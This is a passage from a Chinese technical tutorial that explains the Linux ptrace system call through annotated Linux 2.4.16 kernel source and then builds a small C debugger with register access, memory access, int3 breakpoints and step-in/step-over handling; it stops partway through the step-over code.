PTRACE_SYSCALL, PTRACE_SINGLESTEP：运行被暂停的tracee进程就像PTRACE_CONT功能，不同的是PTRACE_SYSCALL表示运行到下一个系统调用(进入或返回)，PTRACE_SINGLESTEP表示仅运行一条指令便停止

以下是Linux-2.4.16内核的ptrace系统调用内部实现源码：
asmlinkage int sys_ptrace(long request, long pid, long addr, long data)        //asmlinkage是指明该函数用堆栈来传递参数
{
    struct task_struct *child;
    struct user * dummy = NULL;
    int i, ret;

    lock_kernel();
    ret = -EPERM;
    if (request == PTRACE_TRACEME) {        /*检查traced状态是否重复*/
        /* are we already being traced? */
        if (current-&gt;ptrace &amp; PT_PTRACED)
            goto out;
        /* set the ptrace bit in the process flags. */
        current-&gt;ptrace |= PT_PTRACED;        //current指向当前进程(task_struct)，因此PTRACE_TRACEME将当前进程设置为PT_PTRACED状态(traced)即被trace者(tracee)
        ret = 0;
        goto out;
    }
    ret = -ESRCH;
    read_lock(&amp;tasklist_lock);                //调度链表上读锁
    child = find_task_by_pid(pid);            //获取目标pid进程结构体(task_struct)
    if (child)
        get_task_struct(child);
    read_unlock(&amp;tasklist_lock);
    if (!child)
        goto out;

    ret = -EPERM;
    if (pid == 1)        /* you may not mess with init */
        goto out_tsk;
    /*就像gdb有直接启动并调试一个程序和附加一个进程并调试两个功能，也是基于ptrace的PTRACE_ATTACH让目标进程处于traced状态*/
    if (request == PTRACE_ATTACH) {
        ret = ptrace_attach(child);
        goto out_tsk;
    }

    ...
    /*这就是ptrace的主体，通过switch case和request完成，这里先了解部分*/
    switch (request) {
    /* when I and D space are separate, these will need to be fixed. */
    /*PTRACE_PEEKTEXT，PTRACE_PEEKDATA功能相同都是从虚拟地址addr中读取数据到data指针中*/
    case PTRACE_PEEKTEXT: /* read word at location addr. */ 
    case PTRACE_PEEKDATA: {
        unsigned long tmp;
        int copied;

        copied = access_process_vm(child, addr, &amp;tmp, sizeof(tmp), 0);
        ret = -EIO;
        if (copied != sizeof(tmp))
            break;
        ret = put_user(tmp,(unsigned long *) data);
        break;
    }

    /* read the word at location addr in the USER area. */
    /*可以检查用户态内存区域(USER area),从USER区域中读取一个字节，偏移量为addr*/
    case PTRACE_PEEKUSR: {
        unsigned long tmp;

        ret = -EIO;
        if ((addr &amp; 3) || addr &lt; 0 || 
            addr &gt; sizeof(struct user) - 3)
            break;

        tmp = 0;  /* Default return condition */
        if(addr &lt; FRAME_SIZE*sizeof(long))
            tmp = getreg(child, addr);
        if(addr &gt;= (long) &amp;dummy-&gt;u_debugreg[0] &amp;&amp;
           addr &lt;= (long) &amp;dummy-&gt;u_debugreg[7]){
            addr -= (long) &amp;dummy-&gt;u_debugreg[0];
            addr = addr &gt;&gt; 2;
            tmp = child-&gt;thread.debugreg[addr];
        }
        ret = put_user(tmp,(unsigned long *) data);
        break;
    }

    /* when I and D space are separate, this will have to be fixed. */
    /*PTRACE_POKETEXT和PTRACE_POKEDATA功能相同都是向虚拟地址addr写入来自data的数据*/
    case PTRACE_POKETEXT: /* write the word at location addr. */
    case PTRACE_POKEDATA:
        ret = 0;
        if (access_process_vm(child, addr, &amp;data, sizeof(data), 1) == sizeof(data))
            break;
        ret = -EIO;
        break;

    case PTRACE_POKEUSR: /* write the word at location addr in the USER area */
        ret = -EIO;
        if ((addr &amp; 3) || addr &lt; 0 || 
            addr &gt; sizeof(struct user) - 3)
            break;

        if (addr &lt; FRAME_SIZE*sizeof(long)) {
            ret = putreg(child, addr, data);
            break;
        }
        /* We need to be very careful here.  We implicitly
           want to modify a portion of the task_struct, and we
           have to be selective about what portions we allow someone
           to modify. */

          ret = -EIO;
          if(addr &gt;= (long) &amp;dummy-&gt;u_debugreg[0] &amp;&amp;
             addr &lt;= (long) &amp;dummy-&gt;u_debugreg[7]){

              if(addr == (long) &amp;dummy-&gt;u_debugreg[4]) break;
              if(addr == (long) &amp;dummy-&gt;u_debugreg[5]) break;
              if(addr &lt; (long) &amp;dummy-&gt;u_debugreg[4] &amp;&amp;
                 ((unsigned long) data) &gt;= TASK_SIZE-3) break;
              
              if(addr == (long) &amp;dummy-&gt;u_debugreg[7]) {
                  data &amp;= ~DR_CONTROL_RESERVED;
                  for(i=0; i&lt;4; i++)
                      if ((0x5f54 &gt;&gt; ((data &gt;&gt; (16 + 4*i)) &amp; 0xf)) &amp; 1)
                          goto out_tsk;
              }

              addr -= (long) &amp;dummy-&gt;u_debugreg;
              addr = addr &gt;&gt; 2;
              child-&gt;thread.debugreg[addr] = data;
              ret = 0;
          }
          break;
    /*都是让tracee继续运行，只是啥时候停止不同*/
    case PTRACE_SYSCALL: /* continue and stop at next (return from) syscall */
    case PTRACE_CONT: { /* restart after signal. */
        long tmp;

        ret = -EIO;
        if ((unsigned long) data &gt; _NSIG)    //data为tracer传给tracee的信号数值，这里检查范围
            break;
        if (request == PTRACE_SYSCALL)
            child-&gt;ptrace |= PT_TRACESYS;    //设置PT_TRACESYS标志，为了在下一个系统调用处停止
        else
            child-&gt;ptrace &amp;= ~PT_TRACESYS;    //清除PT_TRACESYS标志，不停止
        child-&gt;exit_code = data;
    /* make sure the single step bit is not set. 清除EFLAGS的单步标志(Trap Flag)*/
        tmp = get_stack_long(child, EFL_OFFSET) &amp; ~TRAP_FLAG;
        put_stack_long(child, EFL_OFFSET,tmp);
        wake_up_process(child);                //唤醒进程
        ret = 0;
        break;
    }

/*
 * make the child exit.  Best I can do is send it a sigkill. 
 * perhaps it should be put in the status that it wants to 
 * exit.
 */
    case PTRACE_KILL: {
        long tmp;

        ret = 0;
        if (child-&gt;state == TASK_ZOMBIE)    /* already dead */
            break;
        child-&gt;exit_code = SIGKILL;
        /* make sure the single step bit is not set. */
        tmp = get_stack_long(child, EFL_OFFSET) &amp; ~TRAP_FLAG;
        put_stack_long(child, EFL_OFFSET, tmp);
        wake_up_process(child);
        break;
    }
    /*设置单步运行很简单只需将eflags的Trap Flag置1即可*/
    case PTRACE_SINGLESTEP: {  /* set the trap flag. */
        long tmp;

        ret = -EIO;
        if ((unsigned long) data &gt; _NSIG)
            break;
        child-&gt;ptrace &amp;= ~PT_TRACESYS;
        if ((child-&gt;ptrace &amp; PT_DTRACE) == 0) {
            /* Spurious delayed TF traps may occur */
            child-&gt;ptrace |= PT_DTRACE;
        }
        tmp = get_stack_long(child, EFL_OFFSET) | TRAP_FLAG;    //Trap Flag置1
        put_stack_long(child, EFL_OFFSET, tmp);
        child-&gt;exit_code = data;
        /* give it a chance to run. */
        wake_up_process(child);
        ret = 0;
        break;
    }

    case PTRACE_DETACH:
        /* detach a process that was attached. */
        ret = ptrace_detach(child, data);
        break;
    /*读取所有通用寄存器值*/
    case PTRACE_GETREGS: { /* Get all gp regs from the child. */
          if (!access_ok(VERIFY_WRITE, (unsigned *)data, FRAME_SIZE*sizeof(long))) {
            ret = -EIO;
            break;
        }
        for ( i = 0; i &lt; FRAME_SIZE*sizeof(long); i += sizeof(long) ) {
            __put_user(getreg(child, i),(unsigned long *) data);
            data += sizeof(long);
        }
        ret = 0;
        break;
    }
    /*设置所有通用寄存器值*/
    case PTRACE_SETREGS: { /* Set all gp regs in the child. */
        unsigned long tmp;
          if (!access_ok(VERIFY_READ, (unsigned *)data, FRAME_SIZE*sizeof(long))) {
            ret = -EIO;
            break;
        }
        for ( i = 0; i &lt; FRAME_SIZE*sizeof(long); i += sizeof(long) ) {
            __get_user(tmp, (unsigned long *) data);
            putreg(child, i, tmp);
            data += sizeof(long);
        }
        ret = 0;
        break;
    }
    /*获取浮点寄存器值*/
    case PTRACE_GETFPREGS: { /* Get the child FPU state. */
        if (!access_ok(VERIFY_WRITE, (unsigned *)data,
                   sizeof(struct user_i387_struct))) {
            ret = -EIO;
            break;
        }
        ret = 0;
        if ( !child-&gt;used_math ) {
            /* Simulate an empty FPU. */
            set_fpu_cwd(child, 0x037f);
            set_fpu_swd(child, 0x0000);
            set_fpu_twd(child, 0xffff);
        }
        get_fpregs((struct user_i387_struct *)data, child);
        break;
    }
    /*设置浮点寄存器值*/
    case PTRACE_SETFPREGS: { /* Set the child FPU state. */
        if (!access_ok(VERIFY_READ, (unsigned *)data,
                   sizeof(struct user_i387_struct))) {
            ret = -EIO;
            break;
        }
        child-&gt;used_math = 1;
        set_fpregs(child, (struct user_i387_struct *)data);
        ret = 0;
        break;
    }

    case PTRACE_GETFPXREGS: { /* Get the child extended FPU state. */
        ...
    }

    case PTRACE_SETFPXREGS: { /* Set the child extended FPU state. */
        ...
    }

    case PTRACE_SETOPTIONS: {
        if (data &amp; PTRACE_O_TRACESYSGOOD)
            child-&gt;ptrace |= PT_TRACESYSGOOD;
        else
            child-&gt;ptrace &amp;= ~PT_TRACESYSGOOD;
        ret = 0;
        break;
    }

    default:
        ret = -EIO;
        break;
    }
out_tsk:
    free_task_struct(child);
out:
    unlock_kernel();
    return ret;
}

注意这个函数get_stack_long(proccess, offset)：
/*
 * this routine will get a word off of the processes privileged stack. 
 * the offset is how far from the base addr as stored in the TSS.  
 * this routine assumes that all the privileged stacks are in our
 * data space.
 */   
static inline int get_stack_long(struct task_struct *task, int offset)
{
    unsigned char *stack;

    stack = (unsigned char *)task-&gt;thread.esp0;
    stack += offset;
    return (*((int *)stack));
}

其中task-&gt;thread.esp0是堆栈指针，通用的寄存器在堆栈中按顺序排放，通过偏移量0ffset便可以依次读取
PTRACE_TRACEME​    当要调试一个进程时需要其进入被追踪状态(traced)，有两种方法进入该状态：

被调试进程主动调用ptrace(PTRACE_TRACEME, ...)进入traced状态
调试进程调用ptrace(PTRACE_ATTACH, pid, ...)来使指定进程进入

 总之被调试进程必须进入traced状态才能进行调试，因为Linux会对处于traced状态的进程进行特殊操作。以第一种方式来说明：
if (request == PTRACE_TRACEME) {
        /* are we already being traced? */
        if (current-&gt;ptrace &amp; PT_PTRACED)
            goto out;
        /* set the ptrace bit in the process flags. */
        current-&gt;ptrace |= PT_PTRACED;
        ret = 0;
        goto out;
    }

​    只是将当前进程标记为PT_PTRACED状态，但是如果该进程接下来进行execve系统调用去执行一个外部程序时会暂停当前进程，并且发送SIGCHLD信号给父进程，父进程接收到该信号时就可以对被调试进程进行调试。
sys_execve() -&gt; do_execve() -&gt; load_elf_binary()：
static int load_elf_binary(struct linux_binprm * bprm, struct pt_regs * regs)
{
    ...
    if (current-&gt;ptrace &amp; PT_PTRACED)
        send_sig(SIGTRAP, current, 0);
    ...
}

对于处于traced状态的进程执行execve系统调用时会发送一个SIGTRAP给当前进程。这个信号将在do_signal函数处理：
int do_signal(struct pt_regs *regs, sigset_t *oldset) 
{
    for (;;) {
        unsigned long signr;

        spin_lock_irq(&amp;current-&gt;sigmask_lock);
        signr = dequeue_signal(&amp;current-&gt;blocked, &amp;info);
        spin_unlock_irq(&amp;current-&gt;sigmask_lock);

        // 如果进程被标记为 PTRACE 状态
        if ((current-&gt;ptrace &amp; PT_PTRACED) &amp;&amp; signr != SIGKILL) {    //除了SIGKILL信号，都将让tracee停止并通知tracer
            /* 让调试器运行  */
            current-&gt;exit_code = signr;
            current-&gt;state = TASK_STOPPED;   // 让自己进入停止运行状态
            notify_parent(current, SIGCHLD); // 发送 SIGCHLD 信号给父进程表示子进程"死亡(被替换)"
            schedule();                      // 让出CPU的执行权限
            ...
        }
    }
}

所以调试器使用这种方式调试某个程序时大致例程为：

当父进程（调试进程）接收到 SIGCHLD 信号后，表示被调试进程已经标记为被追踪状态并且停止运行，那么调试进程就可以开始进行调试了。
PTRACE_SINGLESTEP​    单步运行是最为常用的，当把tracee设置为单步运行模式时，tracee每执行一条指令CPU都会停止然后向父进程发送一个SIGCHLD信号，在ptrace中实现是将eflags设置trap_flag标志位：
case PTRACE_SINGLESTEP: {  /* set the trap flag. */
        long tmp;

        ret = -EIO;
        if ((unsigned long) data &gt; _NSIG)
            break;
        child-&gt;ptrace &amp;= ~PT_TRACESYS;
        if ((child-&gt;ptrace &amp; PT_DTRACE) == 0) {
            /* Spurious delayed TF traps may occur */
            child-&gt;ptrace |= PT_DTRACE;
        }
        tmp = get_stack_long(child, EFL_OFFSET) | TRAP_FLAG;
        put_stack_long(child, EFL_OFFSET, tmp);
        child-&gt;exit_code = data;
        /* give it a chance to run. */
        wake_up_process(child);
        ret = 0;
        break;
    }

​    能够这样做是基于X86 intel CPU提供一个硬件机制，就是当eflags的Trap Flag置为1时，CPU每执行一条指令都会产生一个异常然后Linux异常处理机制进程处理，由此会发送一个SIGTRAP信号给tracee；核心是：
tmp = get_stack_long(child, EFL_OFFSET) | TRAP_FLAG;
put_stack_long(child, EFL_OFFSET, tmp);


获取进程的 eflags 寄存器的值，并且设置 Trap Flag 标志。
把新的值设置到进程的 eflags 寄存器中。

设置完寄存器后唤醒(wake_up_process)进程，让其进入运行状态：

​    同样的当tracee执行完一条指令获取SIGTRAP信号，在do_signal函数处理信号时，由于current-&gt;ptrace &amp; PT_PTRACED将停止执行并发送SIGCHLD信号给父进程tracer。父进程接收到SIGCHLD信号后就知道tracee停止，可以发送命令来读取或者修改tracee的内存数据或寄存器，或者通过调用 ptrace(PTRACE_CONT, child,...) 来让被调试进程进行运行等
Debugger 基本功能实现​    实现一个简单的debugger，大致模型如下：主程序fork一个子程序去执行待调试程序；然后主程序循环等待用户输入命令，停止主程序停止并等待输入命令的条件就是子程序停止，这会在首次execute一个程序发生，以及单步(PTRACE_SINGLESTEP)或者断点发生。子程序很简单只需要调用execute系统调用启动一个新程序即可

待实现的debugger有三个基本功能：单步，读写寄存器，读写内存。基于这三个功能再添加其他类似于gdb的功能。初始框架如下：
int main(int argc, char *argv[]){
    if(argc &lt; 2){
        fprintf(stderr, "Expecting program name.\n");
        return -1;
    }

    const char *name = argv[1];
    pid_t pid = fork();
    if(pid == 0){
        //child process
        //execute tracee
        ptrace(PTRACE_TRACEME, 0, 0, 0);
        execl(name, name, NULL, NULL);
    }else if(pid &gt; 0){
        //parent process
        //execute tracer
    }else{
        perror("fork.");
        return -1;
    }

    return 0;
}

子程序部分很简单调用exec族函数即可。
Parent​    首先考虑使用一个结构体记录子进程的信息，然后父进程进入一个读取用户命令的循环，这里使用linenoise开源项目实现命令补全，命令记录等功能当然还需要处理命令：
/**
 * debugger uitls
*/
typedef struct Debugger{
    const char *d_name;
    int d_pid;
    Breakpoint *d_brks;            //记录断点
}Debugger;
void dbg_run(Debugger *dbg){
    int wait_status;
    char *cmd;
    waitpid(dbg-&gt;d_pid, &amp;wait_status, 0);
    /*UI for start up*/
    while((cmd = linenoise("minidbg$ ")) != NULL){
        dbg_handle_command(dbg, cmd);
        linenoiseHistoryAdd(cmd);
        linenoiseFree(cmd);
    }
}

​    使用Debugger结构体记录程序状态，主要是子程序pid和之后的断点信息；linenoise("minidbg$ ")会打印minidbg$ 并等待输入，使用dbg_handle_command处理命令包括读写内存，寄存器，下断点等。linenoiseHistoryAdd(cmd)将命令添加到历史记录中
在dbg_handle_command函数中大致结构为：很方便添加新功能，is_prefix辅助函数用于判断缩写指令
void dbg_handle_command(Debugger *dbg, char *cmd){
    char *lcmd = strdup(cmd);
    char *argv[8] = { 0 };    
    char *command;

    argv[0] = strtok(lcmd, " ");
    for(int i = 1; i &lt; 8; i++){
        argv[i] = strtok(NULL, " ");
        if(argv[i] == NULL) break;
    }
    command = argv[0];
    if(command == NULL) return;
    if(is_prefix(command, "continue")){
        /*do_command*/
    }
    else{
        fprintf(stderr, "Unkown command: %s.\n", command);
    }

    return free(lcmd);
}

bool is_prefix(char *s, const char *ss){
    if(s == NULL || ss == NULL) return false;
    if(strlen(s) &gt; strlen(ss)) return false;
    
    return !strncmp(s, ss, strlen(s));
}

读写寄存器​    一个非常基础的功能，基于ptrace(PTRACE_GETREGS, ...)和ptrace(PTRACE_SETREGS, ...)读写寄存器，为了保留寄存器信息在**&lt;sys/user.h&gt;**头文件中定义了如下结构体：
struct user_regs_struct
{
  __extension__ unsigned long long int r15;
  __extension__ unsigned long long int r14;
  __extension__ unsigned long long int r13;
  __extension__ unsigned long long int r12;
  __extension__ unsigned long long int rbp;
  __extension__ unsigned long long int rbx;
  __extension__ unsigned long long int r11;
  __extension__ unsigned long long int r10;
  __extension__ unsigned long long int r9;
  __extension__ unsigned long long int r8;
  __extension__ unsigned long long int rax;
  __extension__ unsigned long long int rcx;
  __extension__ unsigned long long int rdx;
  __extension__ unsigned long long int rsi;
  __extension__ unsigned long long int rdi;
  __extension__ unsigned long long int orig_rax;
  __extension__ unsigned long long int rip;
  __extension__ unsigned long long int cs;
  __extension__ unsigned long long int eflags;
  __extension__ unsigned long long int rsp;
  __extension__ unsigned long long int ss;
  __extension__ unsigned long long int fs_base;
  __extension__ unsigned long long int gs_base;
  __extension__ unsigned long long int ds;
  __extension__ unsigned long long int es;
  __extension__ unsigned long long int fs;
  __extension__ unsigned long long int gs;
};

配合ptrace可以直接按照以上结构体读写寄存器，所以一次读写至少是所有通用寄存器。根据结构体排序定义了如下数据结构体来记录寄存器信息：
/*utils.h*/
enum reg{
    en_rax, en_rbx, en_rcx, en_rdx,
    en_rdi, en_rsi, en_rbp, en_rsp,
    en_r8,  en_r9,  en_r10, en_r11,
    en_r12, en_r13, en_r14, en_r15,
    en_rip, en_rflags,    en_cs,
    en_orig_rax, en_fs_base,
    en_gs_base,
    en_fs, en_gs, en_ss, en_ds, en_es
};

struct reg_descriptor {
    enum reg r;
    char *name;
};
/*utils.c*/
const size_t n_regs = 27;
const struct reg_descriptor g_register_descriptors[] = {
    { en_r15, "r15" },
    { en_r14, "r14" },
    { en_r13, "r13" },
    { en_r12, "r12" },
    { en_rbp, "rbp" },
    { en_rbx, "rbx" },
    { en_r11, "r11" },
    { en_r10, "r10" },
    { en_r9, "r9" },
    { en_r8, "r8" },
    { en_rax, "rax" },
    { en_rcx, "rcx" },
    { en_rdx, "rdx" },
    { en_rsi, "rsi" },
    { en_rdi, "rdi" },
    { en_orig_rax, "orig_rax" },
    { en_rip, "rip" },
    { en_cs, "cs" },
    { en_rflags, "eflags" },
    { en_rsp, "rsp" },
    { en_ss, "ss" },
    { en_fs_base, "fs_base" },
    { en_gs_base, "gs_base" },
    { en_ds, "ds" },
    { en_es, "es" },
    { en_fs, "fs" },
    { en_gs, "gs" }
};

因为只能一次读写所有寄存器，因此要读写某个寄存器时先用ptrace把所有的读取出来在通过寄存器表查找g_register_descriptors，并且因为寄存器表和struct user_regs_struct结构体排序一致可以直接用表中的偏移读写结构体：
void set_register_value(pid_t pid, enum reg r, uint64_t value){
    struct user_regs_struct regs;
    int reg_descriptor_idx;
    ptrace(PTRACE_GETREGS, pid, NULL, &amp;regs);

    /*locate reg_r`s index in user_regs_struct struct*/
    reg_descriptor_idx = -1;
    for(int i = 0; i &lt; n_regs; i++){
        if(g_register_descriptors[i].r == r){
            reg_descriptor_idx = i;
            break;
        }
    }

    *(uint64_t *)((uint64_t *)&amp;regs + reg_descriptor_idx) = value;
    ptrace(PTRACE_SETREGS, pid, NULL, &amp;regs);

}

uint64_t get_register_value(pid_t pid, enum reg r){
    struct user_regs_struct regs;
    int reg_descriptor_idx;
    uint64_t ret = 0;
    ptrace(PTRACE_GETREGS, pid, NULL, &amp;regs);

    /*locate reg_r`s index in user_regs_struct struct*/
    reg_descriptor_idx = -1;
    for(int i = 0; i &lt; n_regs; i++){
        if(g_register_descriptors[i].r == r){
            reg_descriptor_idx = i;
            break;
        }
    }

    if(reg_descriptor_idx != -1){
        ret = *(uint64_t *)((uint64_t *)&amp;regs + reg_descriptor_idx);
        return ret;
    }
    printf("[error] get_register_value(%d, %d)\n", pid, r);
    return ret;
}

/*辅助函数*/
char *get_register_name(enum reg r){
    for(int i = 0; i &lt; n_regs; i++){
        if(g_register_descriptors[i].r == r)
            return g_register_descriptors[i].name;
    }
    return NULL;
}

enum reg get_register_from_name(char *name){
    for(int i = 0; i &lt; n_regs; i++){
        if(!strcasecmp(name, g_register_descriptors[i].name)){
            return g_register_descriptors[i].r;
        }
    }
    return -1;      /*-1 is impossible in reg_descriptor-&gt;r*/
}

读写内存​    读写内存和寄存器很类似，但使用ptrace一次性只能读写8字节(64位)：ptrace(PTRACE_PEEKDATA, dbg-&gt;d_pid, address, NULL)需要提供子进程的虚拟内存地址(address)
uint64_t dbg_read_memory(Debugger *dbg, uint64_t address){
    return ptrace(PTRACE_PEEKDATA, dbg-&gt;d_pid, address, NULL);
}

void dbg_write_memory(Debugger *dbg, uint64_t address, uint64_t value){
    ptrace(PTRACE_POKEDATA, dbg-&gt;d_pid, address, value);
}

断点​    断点其实有两种：硬断点和软断点。其中硬断点涉及到CPU架构数量有限比如x86结构提供4个硬件断点(断点寄存器)，但可以检测读写执行三种情况。而软断点通过在指定位置插入断点指令，然后程序运行到此处执行断点指令让debugger获取SIGTRAP信号并停止运行，因此软断点可以有无数个；这里主要实现软断点，如x86的断点指令为int 3(机器码 0xcc)，需要考虑断点插入，断点记录，触发断点后如何继续运行等
使用如下结构体存储断点信息：
/**
 * breakpoints utils
*/
typedef struct Breakpoint{
    int b_pid;
    unsigned long b_addr;           //map key
    int b_enabled;
    unsigned char b_saved_data;        //需要保存插入0xcc位置的数据
    UT_hash_handle hh;
}Breakpoint;

借助[uthash](troydhanson/uthash: C macros for hash tables and more (github.com))开源项目实现一个hash表来记录断点信息，只需在结构体中包含UT_hash_handle成员即可；其提供宏HASH_FIND_PTR：
#define HASH_FIND_PTR(head,findptr,out) HASH_FIND(hh,head,findptr,sizeof(void *),out)

可以通过结构体中的b_addr作为key，其表头在初始化Debugger结构体时设置为NULL即可：
Debugger dbg;
dbg.d_brks = NULL;       /* important! initialize to NULL related to breakpoints` map*/

然后实现两个断点函数：brk_enable，brk_disable；分别进行插入断点和去除断点：
#include "utils.h"

void brk_enable(Breakpoint *bp){
    unsigned long data = ptrace(PTRACE_PEEKDATA, bp-&gt;b_pid, bp-&gt;b_addr, 0);
    bp-&gt;b_saved_data = data &amp; 0xff;     //save LSB
    data = ((data &amp; ~0xff) | INT3);
    ptrace(PTRACE_POKEDATA, bp-&gt;b_pid, bp-&gt;b_addr, data);
    bp-&gt;b_enabled = 1;
}

void brk_disable(Breakpoint *bp){
    unsigned long data = ptrace(PTRACE_PEEKDATA, bp-&gt;b_pid, bp-&gt;b_addr, 0);
    data = ((data &amp; ~0xff) | bp-&gt;b_saved_data);
    ptrace(PTRACE_POKEDATA, bp-&gt;b_pid, bp-&gt;b_addr, data);
    bp-&gt;b_enabled = 0;
}

单步​    单步运行时除了普通指令，需要考虑是否跳过函数调用(call)也就是需要步过的情况，还有如果当前为断点处单步时需要格外的断点处理。基于ptrace(PTRACE_SINGLESTEP, ...)单步步入时需要考虑两种情况，涉及断点；其他非断点情况直接PTRACE_SINGLESTEP单步运行即可

pc刚好触发一个断点，即执行了0xcc
pc即将触发一个断点

使用如下函数处理单步命令：
/*we can show UI here*/
void dbg_step_in(Debugger *dbg){
    uint64_t possible_pc = get_pc(dbg) - 1;    /*if this is breakpoint int 3 executed*/
    Breakpoint *bp = NULL;
    HASH_FIND_PTR(dbg-&gt;d_brks, &amp;possible_pc, bp);
    if(bp != NULL &amp;&amp; bp-&gt;b_enabled){
        /*step over breakpoint*/
        brk_disable(bp);
        set_pc(dbg, possible_pc);
        ptrace(PTRACE_SINGLESTEP, dbg-&gt;d_pid, NULL, NULL);
        wait_for_signal(dbg);
        brk_enable(bp);
    }else{
        ptrace(PTRACE_SINGLESTEP, dbg-&gt;d_pid, NULL, NULL);
        wait_for_signal(dbg);
    }

    show_UI(dbg);
}

但是后来发现一个bug：当断点设置在一个单机器码的指令处时(如 push rbp 0x55)，以上逻辑会陷入死循环，因为每次单步时都会检测pc-1是否为断点；所以得想办法面对单机器码断点的情况避免该逻辑，不可能把所有单机器码指令全列出来然后比对，所以这里使用反编译引擎capstone。如果pc-1是个断点那么先判断pc-1处的指令长度是否为1，如果是那么设置一个静态flag表示已经步过一个单机器码的断点下一次单步时不再考虑pc-1：
/**
 * This function invoked in situation:
 * 1.PTRACE_SINGLESTEP the current instruction which maybe inserted a breakpoint OR maybe not
 * 2.already triggered a breakpoint(0xcc) PTRACE_SINGLESTEP the broken instruction
 * we can show UI here
*/
void dbg_step_in(Debugger *dbg){
    static bool one_machine_code_flag = false;
    uint64_t possible_pc, data;
    Breakpoint *bp = NULL;
    csh handle = 0;
    cs_insn* insn;
    size_t count;
    int child_status;

    if(!one_machine_code_flag){
        possible_pc = get_pc(dbg) - 1;          /*if this is breakpoint int 3 executed*/
        HASH_FIND_PTR(dbg-&gt;d_brks, &amp;possible_pc, bp);
        if(bp != NULL &amp;&amp; bp-&gt;b_enabled){
            brk_disable(bp);
            /*check for single machine code instruction*/
            data = ptrace(PTRACE_PEEKDATA, dbg-&gt;d_pid, possible_pc, NULL);  
            if (cs_open(CS_ARCH_X86, CS_MODE_64, &amp;handle)) {
                printf("[error]: Failed to initialize capstone engine!\n");
                exit(-1);
            }
            cs_disasm(handle, (unsigned char*)&amp;data, 8, 0x1000, 1, &amp;insn);
            if(insn-&gt;size == 1){
                one_machine_code_flag = true;
            }else{
                one_machine_code_flag = false;
            }
            set_pc(dbg, possible_pc);
            ptrace(PTRACE_SINGLESTEP, dbg-&gt;d_pid, NULL, NULL);
            wait_for_signal(dbg);
            brk_enable(bp);
        }else{
            /*if we are here then this`s caused by PTRACE_SINGLESTEP and maybe we going to trigger a breakpoint or maybe not*/
            possible_pc += 1;
            one_machine_code_flag = false;
            HASH_FIND_PTR(dbg-&gt;d_brks, &amp;possible_pc, bp);
            if(bp != NULL &amp;&amp; bp-&gt;b_enabled){
                brk_disable(bp);
                ptrace(PTRACE_SINGLESTEP, dbg-&gt;d_pid, NULL, NULL);
                wait_for_signal(dbg);
                brk_enable(bp);
            }else{
                ptrace(PTRACE_SINGLESTEP, dbg-&gt;d_pid, NULL, NULL);
                wait_for_signal(dbg);
            }   
        }
    }else{
        /*the previous instruction is a single machine code instruction and breakpoint*/
        possible_pc = get_pc(dbg);      /*check current pc*/
        one_machine_code_flag = false;
        HASH_FIND_PTR(dbg-&gt;d_brks, &amp;possible_pc, bp);
        if(bp != NULL &amp;&amp; bp-&gt;b_enabled){
            brk_disable(bp);
            ptrace(PTRACE_SINGLESTEP, dbg-&gt;d_pid, NULL, NULL);
            wait_for_signal(dbg);
            brk_enable(bp);
        }else{
            ptrace(PTRACE_SINGLESTEP, dbg-&gt;d_pid, NULL, NULL);
            wait_for_signal(dbg);            
        }

    }
    show_UI(dbg);
}

​    步过主要用在函数调用上，在使用步过时主要考虑以下几种情况：

pc触发了需要步过的call指令上的断点，即pc执行了0xcc
pc即将步过的call指令上被插入了断点
其他就是单步情况

这里步过一个call采用的方式是在call指令下一条指令下断点然后PTRACE_CONT。同样使用capstone计算call指令长度然后断下后面一条指令，这样需要考虑如果被step over的函数如果没有中断那么将触发call指令后面一条指令，那么INT3被执行还需让pc-1
/**
 * This function invoked in 4 situation:
 * 1.Just work as step in
 * 2.jump over a call but has triggered an breakpoint(0xcc)
 * 3.jump over a call but no breakpoint in current call instruction
 * 4.jump over a call but there is 0xcc in current call instruction
 * we can show UI here
*/
void dbg_step_over(Debugger *dbg){
    uint64_t possible_pc_prev = get_pc(dbg) - 1;        /*if this is breakpoint int 3 executed*/
    uint64_t possible_pc_currn = possible_pc_prev + 1;   /*if current instruction is breakpoint*/
    Breakpoint *bp_prev = NULL;
    Breakpoint *bp_currn = NULL;
    uint64_t data;
    uint64_t next_addr;

    /*Maybe stoped for triggered a breakpoint*/
    /*previous instruction. Jump over a call but has triggered an breakpoint(0xcc)*/
    HASH_FIND_PTR(dbg-&gt;d_brks, &amp;possible_pc_prev, bp_prev);
    if(bp_prev != NULL &amp;&amp; bp_prev-&gt;b_enabled &amp;&amp; bp_prev-&gt;b_saved_data == 0xE8){     /*call`s op code is 0xE8*/
        /*call instruction has been triggered*/
        brk_disable(bp_prev);
        data = ptrace(PTRACE_PEEKDATA, dbg-&gt;d_pid, possible_pc_prev, NULL);
        csh handle = 0;
        cs_insn* insn;
        size_t count;
        int child_status;
        if (cs_open(CS_ARCH_X86, CS_MODE_64, &amp;handle)) {
            printf("[error]: Failed to initialize capstone engine!\n");
            exit(-1);
        }
        cs_disasm(handle, (unsigned char*)&amp;data, 8, possible_pc_prev, 1, &amp;insn);
        next_addr = possible_pc_prev + insn-&gt;size;
        dbg_set_breakpoint_at_address(dbg, next_addr);
        set_pc(dbg, possible_pc_prev);
        continue_execution(dbg);                        /*Probably trigger another breakpoint in the function. So we need to disable it when stop*/
        brk_enable(bp_prev);
        
        HASH_FIND_PTR(dbg-&gt;d_brks, &amp;next_addr, bp_prev);
        if(bp_prev != NULL &amp;&amp; bp_prev-&gt;b_enabled){
            brk_disable(bp_prev);                       /*disable it*/
        }
        if((get_pc(dbg) - 1) == next_addr){             /*we stoped maybe because of triggering int3 below the call. So after continue we should check executed int3*/
            set_pc(dbg, next_addr);          
        }
        cs_free(insn, 1);
        cs_close(&amp;handle);
        return;
    }else if(bp_prev != NULL &amp;&amp; bp_prev-&gt;b_enabled &amp;&amp; bp_prev-&gt;b_saved_data != 0xE8){
        /*normal instruction has been triggered. Just work as step in*/
        dbg_step_in(dbg);
        return;
    }

    /*stoped for PTRACE_SINGLESTEP*/
    /*current instruction. Jump over a call but there is 0xcc in current call instruction*/
    HASH_FIND_PTR(dbg-&gt;d_brks, &amp;possible_pc_currn, bp_currn);
    if(bp_currn != NULL &amp;&amp; bp_currn-&gt;b_enabled &amp;&amp; bp_currn-&gt;b_saved_data == 0xE8){
        /*current instruction is breakpoint and it`s a function invoking*/
        brk_disable(bp_currn);
        data = ptrace(PTRACE_PEEKDATA, dbg-&gt;d_pid, possible_pc_currn, NULL);
        csh handle = 0;
        cs_insn* insn;
        size_t count;
        int child_status;
